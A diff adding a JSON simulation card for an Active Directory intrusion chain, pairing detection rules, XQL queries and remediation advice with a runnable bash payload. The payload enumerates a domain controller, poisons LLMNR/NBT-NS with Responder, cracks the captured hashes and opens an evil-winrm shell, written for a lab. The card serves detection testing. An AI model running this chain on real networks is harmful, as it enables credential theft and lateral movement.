@@ -1,0 +1,509 @@
+{
+  "id": "TTP-2026-0141",
+  "schema_version": "1.0.0",
+  "entry_version": "1.0.0",
+  "status": "active",
+  "metadata": {
+    "created_at": "2026-07-25T00:27:24+00:00",
+    "updated_at": "2026-07-25T00:27:24+00:00",
+    "authors": [
+      {
+        "name": "Henry Reed",
+        "email": "hreed@paloaltonetworks.com",
+        "role": "author"
+      }
+    ],
+    "tags": [
+      "plane-itdr",
+      "active-directory",
+      "kill-chain",
+      "llmnr-poisoning",
+      "credential-access",
+      "lateral-movement",
+      "kali",
+      "severity-high"
+    ],
+    "source_refs": [
+      "SRC-MITRE-ATTACK",
+      "SRC-SPECTEROPS",
+      "SRC-DFIR-REPORT",
+      "SRC-CISA"
+    ],
+    "pov_engine": {
+      "engine_version_min": "0.1.0",
+      "auto_load": true,
+      "simulation_class": "identity",
+      "destructive": false,
+      "requires_network_egress": true,
+      "requires_internet": false,
+      "platforms": [
+        "linux"
+      ],
+      "estimated_runtime_seconds": 1500,
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Internal AD Kill-Chain: Poisoning → Offline Crack → Credential Validation → WinRM Lateral (SIM-ITDR-015)",
+    "summary": "A connected internal AD kill-chain against the itdr lab: enum4linux-ng/smbmap enumerate, Responder captures a NetNTLMv2 hash, john/hashcat crack it offline, netexec validates the credential, evil-winrm lands a WinRM shell — one causality graph from a single recon-shell CGO, detected across NDR/ITDR/EDR and stitched by CR-ITDR-0015.",
+    "description": "This card backs SIM-ITDR-015, a full internal-network Active Directory kill-chain that a Domain Consultant runs against the CortexSim itdr Terraform lab (Domain Controller + workstations with seeded roastable/lab accounts) to prove Cortex detection coverage across the credential-access-to-lateral-movement arc. The chain is deliberately CONNECTED rather than a set of isolated tests: a single operator recon shell on the attacker foothold (the CGO) forks every tool, so each stage inherits the same causality lineage / source identity. Stage 1 (discovery): enum4linux-ng performs SAMR/LSARPC directory enumeration and smbmap maps SMB shares and permissions against the DC — a same-source RPC/LDAP fan-out the NGFW/NDR sees and a directory-object read burst the Windows Security log records. Stage 2 (credential access): Responder answers LLMNR (UDP 5355) and NBT-NS (UDP 137) broadcast name queries for names it does not own and captures the resulting NetNTLMv2 authentication — an ABIOC anchored on the learned per-host name-resolution baseline flags the rogue responder, and a validation XQL confirms inbound NetNTLMv2 to the attacker host. Stage 3 (offline crack): john and hashcat crack the captured NetNTLMv2 hash locally on the foothold — pure CPU/GPU work invisible to the network but visible to EDR as a cracking-tool process whose causality_actor_process lineage roots in the same recon shell. Stage 4 (validation): netexec (nxc) replays the cracked domain credential across the lab subnet, producing single-account network logons that fan out across multiple hosts from the attacker IP. Stage 5 (lateral movement): evil-winrm opens a WinRM session and lands an interactive shell, observed as wsmprovhost.exe spawning cmd/powershell on the target — the endpoint_network_stitch payoff. A correlation rule (CR-ITDR-0015) fuses the poisoning capture, the offline crack, the credential validation, and the WinRM landing — all tied to one source_ip / recon-shell CGO — into a single incident, proving Cortex both sees each stage and reconstructs the whole chain. SAFE-MODE: Responder runs in analyze/observe posture, the credential is a seeded lab account, the WinRM step runs only a benign whoami, and every target is the itdr lab (${CORTEXSIM_DC_TARGET}/${CORTEXSIM_AD_TARGET}); nothing is destructive.",
+    "severity": "high",
+    "confidence": "high"
+  },
+  "threat_context": {
+    "actors": [
+      {
+        "name": "Internal-network intrusion operators and ransomware affiliates using the classic Responder → offline-crack → lateral-WinRM playbook"
+      }
+    ],
+    "campaigns": [
+      "Generic internal Active Directory compromise (LLMNR/NBT-NS poisoning to lateral movement)"
+    ],
+    "malware_families": [],
+    "industries_targeted": [
+      "all"
+    ],
+    "first_observed": "2016-01-01"
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1087",
+        "subtechnique_id": "T1087.002",
+        "name": "Account Discovery: Domain Account",
+        "tactic_ids": [
+          "TA0007"
+        ],
+        "tactic_names": [
+          "Discovery"
+        ]
+      },
+      {
+        "technique_id": "T1135",
+        "name": "Network Share Discovery",
+        "tactic_ids": [
+          "TA0007"
+        ],
+        "tactic_names": [
+          "Discovery"
+        ]
+      },
+      {
+        "technique_id": "T1557",
+        "subtechnique_id": "T1557.001",
+        "name": "Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay",
+        "tactic_ids": [
+          "TA0006"
+        ],
+        "tactic_names": [
+          "Credential Access"
+        ]
+      },
+      {
+        "technique_id": "T1110",
+        "subtechnique_id": "T1110.002",
+        "name": "Brute Force: Password Cracking",
+        "tactic_ids": [
+          "TA0006"
+        ],
+        "tactic_names": [
+          "Credential Access"
+        ]
+      },
+      {
+        "technique_id": "T1078",
+        "name": "Valid Accounts",
+        "tactic_ids": [
+          "TA0005"
+        ],
+        "tactic_names": [
+          "Defense Evasion"
+        ]
+      },
+      {
+        "technique_id": "T1021",
+        "subtechnique_id": "T1021.006",
+        "name": "Remote Services: Windows Remote Management",
+        "tactic_ids": [
+          "TA0008"
+        ],
+        "tactic_names": [
+          "Lateral Movement"
+        ]
+      }
+    ],
+    "kill_chain_phase": "exploitation",
+    "data_sources": [
+      "Network Traffic: Network Traffic Flow",
+      "Network Traffic: Network Traffic Content",
+      "Process: Process Creation",
+      "Logon Session: Logon Session Creation",
+      "Command: Command Execution"
+    ]
+  },
+  "execution": {
+    "target_platform": "linux",
+    "execution_framework": "custom-cortex",
+    "framework_reference_id": "SIM-ITDR-015 — Internal AD kill-chain (enum4linux-ng/smbmap → Responder → john/hashcat → netexec → evil-winrm) against the itdr IaC lab",
+    "privilege_required": "root",
+    "prerequisites": [
+      {
+        "description": "itdr IaC module applied so the Domain Controller (${CORTEXSIM_DC_TARGET}) and workstations with seeded lab accounts are reachable on the lab subnet.",
+        "check_command": "nxc smb \"${CORTEXSIM_DC_TARGET}\" -u '' -p '' 2>/dev/null | head -1 || true"
+      },
+      {
+        "description": "Cortex XDR/XSIAM agents on the domain hosts and NGFW/NDR ingesting traffic logs for the lab subnet.",
+        "check_command": "systemctl status cortex-agent || ls /opt/traps || true"
+      },
+      {
+        "description": "Launch consent (simulation_authorized) granted — every tool in this chain is a dual-use-lab-only adapter gated by the orchestrator adapter-consent check.",
+        "check_command": "echo \"consent.simulation_authorized must be true at launch\""
+      }
+    ],
+    "payload": {
+      "interpreter": "bash",
+      "code": "# SAFE-MODE internal AD kill-chain against the itdr lab ONLY. Responder runs in\n# analyze posture; the credential is a seeded lab account; WinRM runs a benign whoami.\nset -uo pipefail\nDC=\"${CORTEXSIM_DC_TARGET:-127.0.0.1}\"\nTGT=\"${CORTEXSIM_AD_TARGET:-127.0.0.1}\"\nIFACE=\"${CORTEXSIM_RESPONDER_IFACE:-eth0}\"\nWL=\"${CORTEXSIM_WORDLIST:-/usr/share/wordlists/rockyou.txt}\"\nUSER=\"${CORTEXSIM_AD_USER:-svc-lab}\"\nPASS=\"${CORTEXSIM_AD_PASS:-LabPassw0rd!}\"\nenum4linux-ng -A \"$DC\" -oJ /tmp/cortexsim-itdr-015-enum4linux || true\nsmbmap -H \"$DC\" -u guest -p '' || true\nresponder -I \"$IFACE\" -A | tee /tmp/cortexsim-itdr-015-responder.log || true\njohn --format=netntlmv2 --wordlist=\"$WL\" /tmp/cortexsim-itdr-015-netntlmv2.txt || true\nhashcat -m 5600 -a 0 /tmp/cortexsim-itdr-015-netntlmv2.txt \"$WL\" --potfile-path=/tmp/cortexsim-itdr-015-hashcat.pot --quiet || true\nnxc smb \"$TGT\" -u \"$USER\" -p \"$PASS\" || true\necho 'whoami; hostname; exit' | evil-winrm -i \"$TGT\" -u \"$USER\" -p \"$PASS\" || true",
+      "input_variables": [
+        {
+          "name": "CORTEXSIM_DC_TARGET",
+          "type": "string",
+          "default": "127.0.0.1",
+          "description": "itdr-lab Domain Controller IP/host (enumeration + share mapping target)."
+        },
+        {
+          "name": "CORTEXSIM_AD_TARGET",
+          "type": "string",
+          "default": "127.0.0.1",
+          "description": "itdr-lab domain host/subnet for credential validation + WinRM lateral movement."
+        },
+        {
+          "name": "CORTEXSIM_RESPONDER_IFACE",
+          "type": "string",
+          "default": "eth0",
+          "description": "Lab-segment interface Responder listens on (analyze posture)."
+        },
+        {
+          "name": "CORTEXSIM_AD_USER",
+          "type": "string",
+          "default": "svc-lab",
+          "description": "Seeded lab account whose NetNTLMv2 hash is captured and cracked."
+        },
+        {
+          "name": "CORTEXSIM_AD_PASS",
+          "type": "string",
+          "default": "LabPassw0rd!",
+          "description": "Seeded lab account password (synthetic, itdr-module default)."
+        }
+      ],
+      "timeout_seconds": 1500
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "network-connection",
+        "description": "Single-source SMB/RPC/LDAP fan-out (dst_port 135/139/389/445/636) to the DC from the attacker foothold (enum4linux-ng/smbmap).",
+        "expected_value": "src_ip distinct dst_port >= 3 and conns >= 20"
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "Inbound NetNTLMv2 authentication to the attacker host after LLMNR/NBT-NS name responses (Responder capture).",
+        "expected_value": "dst_ip = attacker_host and dst_port in (137, 139, 445, 5355)"
+      },
+      {
+        "artifact_type": "process",
+        "description": "Offline cracking-tool process (john/hashcat) on the foothold whose causality_actor_process roots in the recon shell.",
+        "expected_value": "action_process_image_name in (john, hashcat) and causality_actor_process_image_name in (bash, zsh, sh, responder)"
+      },
+      {
+        "artifact_type": "process",
+        "description": "wsmprovhost.exe spawning cmd/powershell on the domain host — the WinRM lateral landing.",
+        "expected_value": "causality_actor_process_image_name = wsmprovhost.exe"
+      }
+    ],
+    "cleanup": {
+      "interpreter": "bash",
+      "code": "rm -f /tmp/cortexsim-itdr-015-enum4linux* /tmp/cortexsim-itdr-015-smbmap.txt /tmp/cortexsim-itdr-015-responder.log /tmp/cortexsim-itdr-015-netntlmv2.txt /tmp/cortexsim-itdr-015-john.txt /tmp/cortexsim-itdr-015-hashcat.pot* /tmp/cortexsim-itdr-015-nxc.txt /tmp/cortexsim-itdr-015-winrm.txt; echo '[CortexSim] SIM-ITDR-015 cleanup complete — itdr lab resources owned by terraform destroy.'"
+    }
+  },
+  "detections": {
+    "iocs": [
+      {
+        "ioc_type": "user-agent",
+        "value": "Ruby WinRM Client",
+        "context": "Default WSMan/HTTP user-agent emitted by evil-winrm on the lateral WinRM session to the domain host.",
+        "reputation_required": "any"
+      },
+      {
+        "ioc_type": "filename",
+        "value": "Responder-Session.log",
+        "context": "Responder session/capture log written on the attacker foothold when LLMNR/NBT-NS name queries are logged and NetNTLMv2 material is captured.",
+        "reputation_required": "any"
+      }
+    ],
+    "biocs": [
+      {
+        "name": "ITDR-015 Null-Session Directory Enumeration Against Domain Controller",
+        "description": "A single source host issues a burst of SAMR/LSARPC directory-object reads against a Domain Controller (users, groups, domain policy) consistent with enum4linux-ng AD enumeration. The CGO here is the operator recon shell on the attacker foothold; this is the opening move of the kill chain.",
+        "logic": "dataset = msft_windows_security\n| filter event_id in (4661, 4662) and object_type in (\"SAM_USER\", \"SAM_GROUP\", \"SAM_DOMAIN\")\n| comp count() as dir_reads, count_distinct(object_name) as objects by ip_address, account_name\n| filter objects >= 10\n| fields ip_address, account_name, dir_reads, objects",
+        "severity": "medium",
+        "mitre_technique_ids": [
+          "T1087.002"
+        ]
+      },
+      {
+        "name": "ITDR-015 SMB Share Enumeration And Permission Mapping",
+        "description": "A single source enumerates many SMB shares and maps their read/write permissions on the lab file/DC hosts (smbmap), a share-discovery burst that widens the attacker's picture of reachable data before credential capture.",
+        "logic": "dataset = msft_windows_security\n| filter event_id in (5140, 5145)\n| comp count_distinct(share_name) as shares, count() as accesses by ip_address, account_name\n| filter shares >= 5\n| fields ip_address, account_name, shares, accesses",
+        "severity": "medium",
+        "mitre_technique_ids": [
+          "T1135"
+        ]
+      },
+      {
+        "name": "ITDR-015 Offline Credential-Cracking Tool Execution With Recon-Shell Lineage",
+        "description": "An offline password-cracking binary (john or hashcat) executes on the attacker foothold with its causality actor rooted in the operator recon shell (or the responder capture process) — the offline-crack leg of the chain. Keying on causality_actor_process_command_line ties the crack to the same lineage that ran the enumeration and poisoning.",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name in (\"john\", \"hashcat\")\n| filter causality_actor_process_image_name in (\"bash\", \"zsh\", \"sh\", \"responder\")\n| fields agent_hostname, actor_effective_username, causality_actor_process_command_line, causality_actor_process_image_name, action_process_image_name",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1110.002"
+        ]
+      },
+      {
+        "name": "ITDR-015 Compromised-Account Authentication From Attacker Foothold",
+        "description": "The cracked domain credential is replayed from the attacker foothold IP, producing successful network logons across two or more distinct domain hosts in a short window (netexec validation spray). Same-source, single-account fan-out across hosts is the credential-validation signature bridging the crack to lateral movement.",
+        "logic": "dataset = msft_windows_security\n| filter event_id = 4624 and logon_type = 3\n| comp count_distinct(computer_name) as hosts, count() as logons by ip_address, account_name\n| filter hosts >= 2\n| fields ip_address, account_name, hosts, logons",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1078"
+        ]
+      },
+      {
+        "name": "ITDR-015 WinRM Lateral Movement Landing Remote Shell",
+        "description": "A WinRM service host (wsmprovhost.exe) spawns an interactive shell (cmd.exe/powershell.exe) on a domain host — the endpoint-side landing of an evil-winrm lateral session. causality_actor_process_image_name = wsmprovhost.exe is the stitch between the inbound WinRM network session and the remote shell it lands.",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter causality_actor_process_image_name = \"wsmprovhost.exe\"\n| filter action_process_image_name in (\"cmd.exe\", \"powershell.exe\", \"conhost.exe\")\n| fields agent_hostname, causality_actor_process_command_line, action_process_image_name",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1021.006"
+        ]
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "ITDR-015 Rogue LLMNR And NBT-NS Responder With NetNTLMv2 Capture",
+        "description": "A host on the segment begins authoritatively answering LLMNR (UDP 5355) and NBT-NS (UDP 137) broadcast name queries for names it has never legitimately owned, then receives inbound NetNTLMv2 authentication — the behavioral signature of a rogue Responder poisoning names to harvest hashes. The ABIOC anchors on the learned per-host name-resolution baseline: the responder host deviates by suddenly resolving a spike of distinct names.",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.NETWORK\n| filter action_local_port in (137, 5355) or action_remote_port in (137, 5355)\n| comp count() as name_responses, count_distinct(dns_query_name) as names by agent_hostname, action_local_ip\n| filter name_responses >= 10 and names >= 5\n| fields agent_hostname, action_local_ip, name_responses, names",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1557.001"
+        ],
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "Learned per-host name-resolution baseline (which hosts legitimately answer LLMNR/NBT-NS and for which names); the rogue responder deviates by authoritatively answering a spike of distinct names it never previously owned and drawing inbound NetNTLMv2 auth."
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "ITDR-015 SMB RPC LDAP Enumeration Fan-Out To Domain Controller",
+        "query": "dataset = panw_ngfw_traffic_raw\n| filter _time > to_timestamp(current_time() - 1800)\n| filter flow_direction = \"inbound\" and dst_port in (135, 139, 389, 445, 636)\n| comp count() as conns, count_distinct(dst_port) as ports by src_ip, dst_ip\n| filter ports >= 3 and conns >= 20\n| sort desc conns\n| fields src_ip, dst_ip, ports, conns",
+        "expected_rows_min": 1,
+        "dataset": "panw_ngfw_traffic_raw"
+      },
+      {
+        "purpose": "validation",
+        "name": "ITDR-015 SMB Share-Enumeration Fan-Out From Single Source",
+        "query": "dataset = msft_windows_security\n| filter _time > to_timestamp(current_time() - 1800)\n| filter event_id = 5140\n| comp count_distinct(share_name) as shares, count() as accesses by ip_address, account_name\n| filter shares >= 5\n| sort desc shares\n| fields ip_address, account_name, shares, accesses",
+        "expected_rows_min": 1,
+        "dataset": "msft_windows_security"
+      },
+      {
+        "purpose": "validation",
+        "name": "ITDR-015 Inbound NetNTLMv2 Authentication To Rogue Responder Host",
+        "query": "dataset = panw_ngfw_traffic_raw\n| filter _time > to_timestamp(current_time() - 1800)\n| filter dst_port in (137, 139, 445, 5355)\n| comp count() as sessions, count_distinct(src_ip) as victims by dst_ip\n| filter victims >= 1 and sessions >= 1\n| sort desc sessions\n| fields dst_ip, victims, sessions",
+        "expected_rows_min": 1,
+        "dataset": "panw_ngfw_traffic_raw"
+      },
+      {
+        "purpose": "validation",
+        "name": "ITDR-015 Offline Cracking-Tool Process With Recon-Shell Causality",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name in (\"john\", \"hashcat\")\n| filter causality_actor_process_image_name in (\"bash\", \"zsh\", \"sh\", \"responder\")\n| comp count() as crack_procs by agent_hostname, actor_effective_username, causality_actor_process_image_name, action_process_image_name\n| filter crack_procs >= 1\n| fields agent_hostname, actor_effective_username, causality_actor_process_image_name, action_process_image_name, crack_procs",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      },
+      {
+        "purpose": "validation",
+        "name": "ITDR-015 Compromised-Account Validation Across Domain Hosts",
+        "query": "dataset = msft_windows_security\n| filter _time > to_timestamp(current_time() - 1800)\n| filter event_id in (4624, 4625) and logon_type = 3\n| comp count_distinct(computer_name) as hosts, count() as attempts by ip_address, account_name\n| filter hosts >= 2\n| sort desc hosts\n| fields ip_address, account_name, hosts, attempts",
+        "expected_rows_min": 1,
+        "dataset": "msft_windows_security"
+      },
+      {
+        "purpose": "validation",
+        "name": "ITDR-015 WinRM Remote-Shell Session Landing On Domain Host",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter causality_actor_process_image_name = \"wsmprovhost.exe\"\n| filter action_process_image_name in (\"cmd.exe\", \"powershell.exe\", \"conhost.exe\")\n| comp count() as shells by agent_hostname, causality_actor_process_image_name, action_process_image_name\n| filter shells >= 1\n| fields agent_hostname, causality_actor_process_image_name, action_process_image_name, shells",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [
+      {
+        "name": "Internal AD Kill-Chain — Enumerate To Poison To Crack To Validate To Lateral WinRM",
+        "rule_id": "CR-ITDR-0015",
+        "logic": "XQL(ITDR-015 Inbound NetNTLMv2 Authentication To Rogue Responder Host) AND XQL(ITDR-015 Offline Cracking-Tool Process With Recon-Shell Causality) AND (XQL(ITDR-015 Compromised-Account Validation Across Domain Hosts) OR BIOC(ITDR-015 Compromised-Account Authentication From Attacker Foothold)) AND (XQL(ITDR-015 WinRM Remote-Shell Session Landing On Domain Host) OR BIOC(ITDR-015 WinRM Lateral Movement Landing Remote Shell)) — stitches the LLMNR/NBT-NS poisoning capture, the offline NetNTLMv2 crack on the attacker foothold, the cracked-credential validation across domain hosts, and the WinRM lateral landing into one credential-access-to-lateral-movement incident, all tied to a single attacker source_ip / recon-shell CGO."
+      }
+    ],
+    "analytics_modules": [
+      "Cortex XSIAM ITDR — LLMNR/NBT-NS poisoning + NetNTLMv2 capture behavioral analytics",
+      "Cortex XDR — offline credential-cracking process causality + WinRM lateral-movement detection",
+      "Cortex NGFW/NDR — internal SMB/RPC/LDAP enumeration fan-out and rogue-responder inbound-auth telemetry"
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xsiam",
+        "submodule": "itdr",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "ITDR-LLMNR-NBTNS-POISONING",
+          "ITDR-NETNTLMV2-CAPTURE"
+        ],
+        "license_required": "advanced",
+        "evidence_query": "dataset = xdr_data | filter event_type = ENUM.NETWORK | filter action_local_port in (137, 5355) | comp count_distinct(dns_query_name) as names by agent_hostname, action_local_ip | filter names >= 5"
+      },
+      {
+        "module": "cortex-xdr",
+        "submodule": "endpoint-analytics",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "XDR-OFFLINE-CRACK-PROC",
+          "XDR-WINRM-LATERAL-LANDING"
+        ],
+        "license_required": "advanced",
+        "evidence_query": "dataset = xdr_data | filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START | filter action_process_image_name in (\"john\", \"hashcat\") or causality_actor_process_image_name = \"wsmprovhost.exe\" | fields agent_hostname, causality_actor_process_image_name, action_process_image_name"
+      },
+      {
+        "module": "ngfw-pa-series",
+        "submodule": "threat-prevention",
+        "coverage_tier": "prevention",
+        "rule_ids": [
+          "NGFW-SMB-RPC-ENUM-FANOUT",
+          "NGFW-WINRM-LATERAL"
+        ],
+        "license_required": "advanced",
+        "evidence_query": "dataset = panw_ngfw_traffic_raw | filter dst_port in (135, 139, 389, 445, 636) and flow_direction = \"inbound\" | comp count_distinct(dst_port) as ports by src_ip, dst_ip | filter ports >= 3"
+      },
+      {
+        "module": "cortex-xsiam",
+        "submodule": "analytics",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "XSIAM-CR-ITDR-0015"
+        ],
+        "license_required": "advanced",
+        "evidence_query": "Correlation CR-ITDR-0015 stitches the poisoning capture, offline crack, credential validation, and WinRM lateral landing from one source_ip / recon-shell CGO into a single incident."
+      }
+    ],
+    "use_cases": [
+      {
+        "use_case_id": "UC-ITDR-015",
+        "name": "Internal AD Kill-Chain Detection — Poisoning to Offline Crack to WinRM Lateral Movement",
+        "description": "Cortex detects each stage of a connected internal AD compromise (enumeration, LLMNR/NBT-NS poisoning + NetNTLMv2 capture, offline crack, credential validation, WinRM lateral movement) and correlates them into one incident tied to a single attacker foothold.",
+        "test_cases": [
+          {
+            "test_case_id": "TC-ITDR-015A",
+            "objective": "Cortex detects the LLMNR/NBT-NS poisoning and NetNTLMv2 capture and flags the offline crack whose causality roots in the recon-shell CGO.",
+            "preconditions": [
+              "itdr IaC lab applied (DC + workstations, seeded lab account).",
+              "Cortex agents on domain hosts + NDR ingesting lab-subnet traffic.",
+              "Launch consent (simulation_authorized) granted for the dual-use adapters."
+            ],
+            "steps": [
+              "Run SIM-ITDR-015 enumeration + Responder + john/hashcat stages.",
+              "Observe the rogue-responder ABIOC, the inbound-NetNTLMv2 XQL, and the offline-crack process detection."
+            ],
+            "success_criteria": [
+              "ABIOC `ITDR-015 Rogue LLMNR And NBT-NS Responder With NetNTLMv2 Capture` fires.",
+              "Inbound-NetNTLMv2 validation XQL returns >= 1 row.",
+              "BIOC `ITDR-015 Offline Credential-Cracking Tool Execution With Recon-Shell Lineage` fires with causality_actor_process lineage populated."
+            ],
+            "expected_score_weight": 0.5
+          },
+          {
+            "test_case_id": "TC-ITDR-015B",
+            "objective": "Cortex detects the cracked-credential validation and the WinRM lateral landing and correlates the full chain into one incident.",
+            "preconditions": [
+              "Preceding stages executed so a cracked lab credential is available."
+            ],
+            "steps": [
+              "Run the netexec validation + evil-winrm lateral stages against the lab subnet.",
+              "Observe the credential-validation fan-out and the wsmprovhost.exe shell landing, then CR-ITDR-0015 escalation."
+            ],
+            "success_criteria": [
+              "Compromised-account validation XQL returns >= 1 single-account, multi-host row.",
+              "BIOC `ITDR-015 WinRM Lateral Movement Landing Remote Shell` fires.",
+              "Correlation CR-ITDR-0015 raises one incident stitching poisoning + crack + validation + lateral."
+            ],
+            "expected_score_weight": 0.5
+          }
+        ]
+      }
+    ]
+  },
+  "remediation_guidance": {
+    "preventive_controls": [
+      "Disable LLMNR (Group Policy: Turn off multicast name resolution) and NBT-NS on all endpoints to eliminate the poisoning surface.",
+      "Enforce SMB signing and require Kerberos to blunt NetNTLMv2 relay/capture value.",
+      "Enforce long/complex service-account passwords (or gMSA) so captured NetNTLMv2 hashes are not offline-crackable in feasible time.",
+      "Restrict WinRM (5985/5986) to management jump hosts and require just-in-time admin, so a validated credential cannot pivot laterally."
+    ],
+    "detection_engineering": [
+      "Alert on any host authoritatively answering LLMNR/NBT-NS for names outside its learned baseline, and on inbound NetNTLMv2 auth to non-server hosts.",
+      "Alert on offline cracking-tool processes (john/hashcat) with a recon-shell causality lineage on non-sanctioned hosts.",
+      "Alert on a single account authenticating (logon_type 3) across multiple hosts from one source IP within a short window.",
+      "Stitch poisoning capture → offline crack → credential validation → WinRM landing into one credential-access-to-lateral-movement incident."
+    ],
+    "response_playbook": "XSOAR-PB-InternalADKillChainTriage-v1"
+  },
+  "references": [
+    {
+      "title": "SpecterOps — Active Directory Attack Paths: LLMNR/NBT-NS Poisoning to Lateral Movement",
+      "url": "https://posts.specterops.io/",
+      "publisher": "SpecterOps",
+      "publisher_id": "SRC-SPECTEROPS",
+      "primary": true
+    },
+    {
+      "title": "The DFIR Report — Internal Reconnaissance, Credential Access, and Lateral Movement case studies",
+      "url": "https://thedfirreport.com/",
+      "publisher": "The DFIR Report",
+      "publisher_id": "SRC-DFIR-REPORT"
+    },
+    {
+      "title": "MITRE ATT&CK T1557.001 — LLMNR/NBT-NS Poisoning and SMB Relay",
+      "url": "https://attack.mitre.org/techniques/T1557/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1021.006 — Remote Services: Windows Remote Management",
+      "url": "https://attack.mitre.org/techniques/T1021/006/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "CISA — Mitigations for LLMNR/NBT-NS Poisoning and Lateral Movement",
+      "url": "https://www.cisa.gov/news-events/cybersecurity-advisories",
+      "publisher": "CISA",
+      "publisher_id": "SRC-CISA"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "1.0.0",
+      "date": "2026-07-24",
+      "author": "Henry Reed",
+      "change": "Promoted SIM-ITDR-015 internal AD kill-chain card from scaffold to active. Real NDR/ITDR/EDR detection logic across the enum4linux-ng/smbmap → Responder → john/hashcat → netexec → evil-winrm chain: rogue-responder ABIOC, 5 BIOCs, 6 validation XQL (SMB/RPC/LDAP fan-out, share enum, inbound NetNTLMv2, offline-crack causality, credential validation, WinRM landing), correlation CR-ITDR-0015, 2 IOCs, and full PANW/UC-TC mapping. Connected-causality chain from a single recon-shell CGO."
+    }
+  ]
+}
